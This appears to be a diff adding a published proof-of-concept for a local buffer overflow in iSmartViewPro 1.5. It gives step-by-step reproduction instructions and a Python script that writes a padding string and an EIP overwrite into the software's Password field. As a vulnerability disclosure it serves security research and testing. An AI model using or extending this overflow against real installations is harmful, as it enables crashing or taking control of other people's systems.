@@ -1,0 +1,29 @@
+# Exploit Title: iSmartViewPro 1.5  - 'Password' Buffer Overflow
+# Discovery by: Javier Enrique Rodriguez Gutierrez
+# Discovery Date: 2018-08-09
+# Vendor Homepage: https://securimport.com/
+# Software Link: https://securimport.com/university/videovigilancia-ip/software/493-software-ismartviewpro-v1-5
+# Tested Version: 1.5
+# Vulnerability Type: Buffer Over Flow Local
+# Tested on OS: Windows 7 Professional x64 es
+  
+# Steps to Produce the BoF: 
+# 1.- Run python code : python generate.py
+# 2.- Open generate.txt and copy content to clipboard
+# 3.- Open iSmartViewPro
+# 4.- clic button "+"
+# 5.- Select "add device manually"
+# 6.- device alias -> "admin"
+# 7.- DNS/IP/DID -> "0.0.0.0"
+# 8.- acount -> "admin"
+# 9.- paste ClipBoard on "Password"
+# 10.- Save
+# 11.- BoF
+ 
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+buffer = "\x41" * 447
+eip = "\x42" * 4
+f = open ("generate.txt", "w")
+f.write(buffer + eip)
+f.close()
